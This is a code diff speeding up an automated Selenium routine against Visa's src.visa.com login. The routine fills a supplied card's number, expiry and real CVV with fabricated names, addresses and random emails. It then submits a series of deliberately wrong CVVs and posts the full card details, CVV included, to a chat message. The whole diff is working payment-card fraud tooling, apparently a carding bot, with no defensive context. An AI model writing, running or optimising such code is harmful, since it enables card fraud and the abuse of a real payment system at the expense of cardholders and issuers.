@@ -4302,66 +4302,61 @@ def run_ze_process(card_input, update_dict):
 
         service = Service(executable_path=CHROME_DRIVER_PATH)
         driver = webdriver.Chrome(service=service, options=options)
-        driver.set_page_load_timeout(15)
-        wait = WebDriverWait(driver, 3)
+        driver.set_page_load_timeout(8)
+        wait = WebDriverWait(driver, 1.5)  # Ultra-short timeout
 
-        driver.get("https://src.visa.com/login")
-        time.sleep(1)
-
-        # Dismiss cookie banner - find Accept button explicitly
-        try:
-            accept_btn = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(),'Accept') or contains(text(),'accept')]")))
-            driver.execute_script("arguments[0].click();", accept_btn)
-            time.sleep(0.3)
-        except Exception:
-            # Backup: try to remove overlay
-            try:
-                driver.execute_script("""
-                    var overlay = document.getElementById('CookieReportsOverlay');
-                    if (overlay) overlay.parentNode.removeChild(overlay);
-                    var banners = document.querySelectorAll('[class*="cookie"], [id*="cookie"], [class*="consent"]');
-                    banners.forEach(function(el) { el.style.display = 'none'; });
-                """)
-            except:
-                pass
-
-        # Fill email
-        email_field = wait.until(EC.visibility_of_element_located((By.ID, "email-input")))
-        email_field.clear()
-        email_field.send_keys(get_random_email())
-        
-        # Click Continue button
-        try:
-            continue_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="continue-button"]')))
-            driver.execute_script("arguments[0].click();", continue_btn)
-        except:
-            # Fallback: find by text
-            continue_btn = driver.find_element(By.XPATH, "//button[contains(text(),'Continue')]")
-            driver.execute_script("arguments[0].click();", continue_btn)
-        
-        time.sleep(1)  # Wait for next page to load
-        
-        # Terms checkbox
-        checkbox = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '[data-testid="terms-checkbox"], input[type="checkbox"]')))
-        driver.execute_script("arguments[0].click();", checkbox)
-        
-        # Next button
-        try:
-            next_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, '[data-testid="next-button"]')))
-            driver.execute_script("arguments[0].click();", next_btn)
-        except:
-            next_btn = driver.find_element(By.XPATH, "//button[contains(text(),'Next')]")
-            driver.execute_script("arguments[0].click();", next_btn)
-
+        # Pre-parse card data while page loads
         cc, mm, yy, real_cvv = split_card(card_input)
-        bin_info, bin_flag = get_bin_info_local(cc[:6])
         short_card = f"{cc}|{mm}|{yy}|{real_cvv}"
-
         wrong_cvv = get_wrong_cvv(real_cvv)
         first_name, last_name, address, city, state, zip_code, phone = get_fake_data()
 
-        # Wait for card form and fill using JavaScript for speed
-        wait.until(EC.visibility_of_element_located((By.ID, "card-input")))
+        driver.get("https://src.visa.com/login")
+
+        # Dismiss cookie + fill email in one go
+        try:
+            driver.execute_script("""
+                setTimeout(function() {
+                    var btns = document.querySelectorAll('button');
+                    for (var i = 0; i < btns.length; i++) {
+                        if (btns[i].innerText.toLowerCase().includes('accept')) {
+                            btns[i].click(); break;
+                        }
+                    }
+                }, 300);
+            """)
+        except:
+            pass
+
+        # Fill email fast
+        email_field = wait.until(EC.presence_of_element_located((By.ID, "email-input")))
+        driver.execute_script("arguments[0].value = arguments[1];", email_field, get_random_email())
+        driver.execute_script("arguments[0].dispatchEvent(new Event('input', {bubbles: true}));", email_field)
+        
+        # Click Continue
+        driver.execute_script("""
+            var btn = document.querySelector('[data-testid="continue-button"]') || 
+                      Array.from(document.querySelectorAll('button')).find(b => b.innerText.includes('Continue'));
+            if (btn) btn.click();
+        """)
+        
+        time.sleep(0.5)
+        
+        # Terms checkbox + Next in one go
+        try:
+            checkbox = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '[data-testid="terms-checkbox"], input[type="checkbox"]')))
+            driver.execute_script("arguments[0].click();", checkbox)
+        except:
+            driver.execute_script("document.querySelector('input[type=\"checkbox\"]').click();")
+        
+        driver.execute_script("""
+            var btn = document.querySelector('[data-testid="next-button"]') || 
+                      Array.from(document.querySelectorAll('button')).find(b => b.innerText.includes('Next'));
+            if (btn) btn.click();
+        """)
+
+        # Wait for card form
+        wait.until(EC.presence_of_element_located((By.ID, "card-input")))
         
         # Batch fill using JavaScript - FASTEST method
         fill_script = """
@@ -4403,51 +4398,39 @@ def run_ze_process(card_input, update_dict):
         except Exception:
             pass
 
-        # Scroll down and click submit button
-        driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
-        time.sleep(0.3)
-        
-        try:
-            add_card_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[data-testid="submit-button"]')))
-        except:
-            try:
-                add_card_btn = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(),'Add card') or contains(text(),'Submit') or contains(text(),'Continue')]")))
-            except:
-                add_card_btn = driver.find_element(By.CSS_SELECTOR, 'button[type="submit"], form button')
-        
-        driver.execute_script("arguments[0].scrollIntoView(true);", add_card_btn)
-        driver.execute_script("arguments[0].click();", add_card_btn)
+        # Click submit using JS - fast
+        driver.execute_script("""
+            window.scrollTo(0, document.body.scrollHeight);
+            var btn = document.querySelector('button[data-testid="submit-button"]') ||
+                      document.querySelector('button[type="submit"]') ||
+                      Array.from(document.querySelectorAll('button')).find(b => 
+                          b.innerText.includes('Add card') || b.innerText.includes('Submit'));
+            if (btn) btn.click();
+        """)
 
-        edit_message("🚀 Updating (FASTEST)...")
-
-        # 6 CVV attempts - using JS for speed
+        # 6 CVV attempts - minimal delay
         TOTAL_TRIES = 6
         used_cvvs = {wrong_cvv}
         for _ in range(TOTAL_TRIES - 1):
-            while True:
+            fake_cvv = ''.join(random.choices('0123456789', k=3))
+            while fake_cvv in used_cvvs:
                 fake_cvv = ''.join(random.choices('0123456789', k=3))
-                if fake_cvv not in used_cvvs:
-                    used_cvvs.add(fake_cvv)
-                    break
+            used_cvvs.add(fake_cvv)
+            time.sleep(0.15)  # Minimal delay
             try:
-                time.sleep(0.3)
-                # Update CVV and click submit
                 driver.execute_script("""
                     var cvv = document.getElementById('cvv-input');
-                    if (cvv) {
-                        cvv.value = arguments[0];
-                        cvv.dispatchEvent(new Event('input', {bubbles: true}));
-                    }
+                    if (cvv) { cvv.value = arguments[0]; cvv.dispatchEvent(new Event('input', {bubbles: true})); }
+                    var btn = document.querySelector('button[data-testid="submit-button"]') ||
+                              document.querySelector('button[type="submit"]');
+                    if (btn) btn.click();
                 """, fake_cvv)
-                try:
-                    btn = driver.find_element(By.CSS_SELECTOR, 'button[data-testid="submit-button"]')
-                    driver.execute_script("arguments[0].click();", btn)
-                except:
-                    btn = driver.find_element(By.XPATH, "//button[contains(text(),'Add card') or contains(text(),'Submit')]")
-                    driver.execute_script("arguments[0].click();", btn)
-            except Exception:
+            except:
                 pass
 
+        # Get BIN info at end (non-blocking)
+        bin_info, bin_flag = get_bin_info_local(cc[:6])
+        
         duration = round(time.time() - start, 2)
         edit_message(
             f"💳 **Card:** `{short_card}`\n"
